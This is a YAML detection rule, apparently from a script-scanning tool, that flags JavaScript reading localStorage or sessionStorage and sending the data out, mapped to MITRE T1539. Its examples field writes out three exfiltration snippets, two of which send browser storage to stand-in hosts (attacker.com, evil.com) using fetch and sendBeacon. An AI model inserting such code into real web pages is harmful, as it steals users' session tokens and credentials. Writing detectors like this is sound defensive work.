# JavaScript Pattern: localStorage/sessionStorage Theft
# Detects theft of browser storage data

id: JS-010
name: Browser Storage Data Theft
description: |
  Detects attempts to access and exfiltrate data from localStorage or sessionStorage.
  Attackers target browser storage to steal authentication tokens, session data,
  and other sensitive information. This pattern identifies bulk storage access
  combined with network transmission or suspicious iteration patterns.
languages:
  - javascript
detection_type: regex
detection_logic: '(?:localStorage|sessionStorage)(?:\.getItem|\.key\(|\[).*(?:fetch|XMLHttpRequest|\.send\(|navigator\.sendBeacon)'
severity: Medium
mitre_technique: T1539
confidence: 0.75
category: credential_access
enabled: true
metadata:
  author: Script Sentinel Team
  created: "2025-11-17"
  updated: "2025-11-17"
  references:
    - "https://attack.mitre.org/techniques/T1539/"
    - "https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage"
  tags:
    - javascript
    - localstorage
    - data-theft
    - session-hijacking
  examples:
    - "fetch('http://attacker.com/collect', {method: 'POST', body: JSON.stringify(localStorage)});"
    - "for(let i=0; i<localStorage.length; i++) { sendData(localStorage.key(i), localStorage.getItem(localStorage.key(i))); }"
    - "navigator.sendBeacon('http://evil.com/log', JSON.stringify(sessionStorage));"